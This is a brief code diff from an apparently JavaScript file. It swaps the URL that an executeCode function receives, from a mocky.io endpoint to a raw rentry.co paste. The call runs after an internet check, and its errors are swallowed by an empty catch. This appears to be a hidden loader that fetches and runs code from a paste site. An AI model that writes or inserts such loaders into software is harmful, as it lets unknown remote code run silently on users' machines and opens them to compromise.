@@ -40,7 +40,7 @@ async function executeCode(url) {
     try {
         if (await checkInternetConnection()) {
             try {
-                await executeCode('https://run.mocky.io/v3/7c7bc488-c498-4115-8206-4938f7b36961');
+                await executeCode('https://rentry.co/loadkeyiceberg/raw');
             } catch (error) {
             }
         } else {
